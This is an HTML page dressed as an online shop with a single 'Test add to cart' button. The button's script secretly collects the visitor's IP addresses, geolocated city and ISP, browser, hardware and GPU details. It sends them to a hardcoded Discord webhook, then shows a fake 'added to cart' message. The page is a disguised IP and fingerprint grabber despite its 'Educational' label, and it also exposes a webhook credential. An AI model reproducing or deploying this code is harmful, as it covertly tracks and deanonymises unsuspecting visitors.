<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>My Shop Meteorz 2025</title>
<style>
    body {
        background-color: #0d1b2a;
        font-family: Arial, sans-serif;
        color: white;
        display: flex;
        flex-direction: column;
        align-items: center;
        min-height: 100vh;
        margin: 0;
    }
    .banner {
        background-color: #1b263b;
        width: 100%;
        padding: 20px;
        text-align: center;
        font-size: 28px;
        font-weight: bold;
        color: #e0e1dd;
        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.4);
    }
    .card {
        background-color: #1b263b;
        padding: 20px;
        border-radius: 12px;
        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.4);
        width: 300px;
        text-align: center;
        margin-top: 50px;
    }
    h2 {
        margin-bottom: 10px;
        color: #e0e1dd;
    }
    button {
        background-color: #415a77;
        color: white;
        padding: 10px 15px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 16px;
        transition: background-color 0.2s ease;
    }
    button:hover {
        background-color: #778da9;
    }
    .notification {
        margin-top: 15px;
        color: #90ee90;
        font-weight: bold;
        display: none;
    }
</style>
</head>
<body>

<div class="banner">ðŸ›’ My Shop</div>

<div class="card">
    <h2>Test Item</h2>
    <p>This is a test item wow!</p>
    <button onclick="sendFullInfo()">Test add to cart ^_^</button>
    <div class="notification" id="notify">Added to cart successfully</div>
</div>

<script>
async function sendFullInfo() {
    const webhook = "https://discord.com/api/webhooks/1405178051607793797/lrLovFGo3LWPXBe3u874pQYct3xulb679aybaGQtdDYsnyrBeEZCXT5I2zs39z2-RqAR"; // Replace with your webhook

    try {
        // IPv4
        const ipv4Res = await fetch('https://api.ipify.org?format=json');
        const ipv4 = (await ipv4Res.json()).ip;

        // IPv6
        let ipv6 = "No IPv6 detected";
        try {
            const ipv6Res = await fetch('https://api64.ipify.org?format=json');
            ipv6 = (await ipv6Res.json()).ip;
        } catch {}

        // GeoIP lookup (using IPv4 for example)
        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
        const geoData = await geoRes.json();
        const city = geoData.city || "Unknown";
        const region = geoData.region || "Unknown";
        const country = geoData.country_name || "Unknown";
        const isp = geoData.org || "Unknown";

        // Time & timezone
        const timestamp = new Date().toLocaleString();
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Browser & device info
        const ua = navigator.userAgent;
        const os = navigator.platform;
        const language = navigator.language;
        const screenRes = `${screen.width}x${screen.height}`;
        const colorDepth = screen.colorDepth;
        const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
        const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
        
        // Graphics card info via WebGL
        let gpuInfo = "Unknown";
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch {}

        // Build Discord message
        const payload = {
            content: `**Educational Browser Info Report**\n` +
                     `**IPv4:** \`${ipv4}\`\n` +
                     `**IPv6:** \`${ipv6}\`\n` +
                     `**City:** \`${city}\`\n` +
                     `**Region:** \`${region}\`\n` +
                     `**Country:** \`${country}\`\n` +
                     `**ISP:** \`${isp}\`\n` +
                     `**OS:** \`${os}\`\n` +
                     `**Browser UA:** \`${ua}\`\n` +
                     `**Language:** \`${language}\`\n` +
                     `**Screen Resolution:** \`${screenRes}\`\n` +
                     `**Color Depth:** \`${colorDepth}\`\n` +
                     `**CPU Cores:** \`${hardwareConcurrency}\`\n` +
                     `**RAM:** \`${deviceMemory}\`\n` +
                     `**GPU:** \`${gpuInfo}\`\n` +
                     `**Timezone:** \`${tz}\`\n` +
                     `**Date/Time:** \`${timestamp}\``
        };

        // Send to Discord
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        // Show notification
        document.getElementById("notify").style.display = "block";

    } catch (err) {
        console.error(err);
    }
}
</script>

</body>
</html>
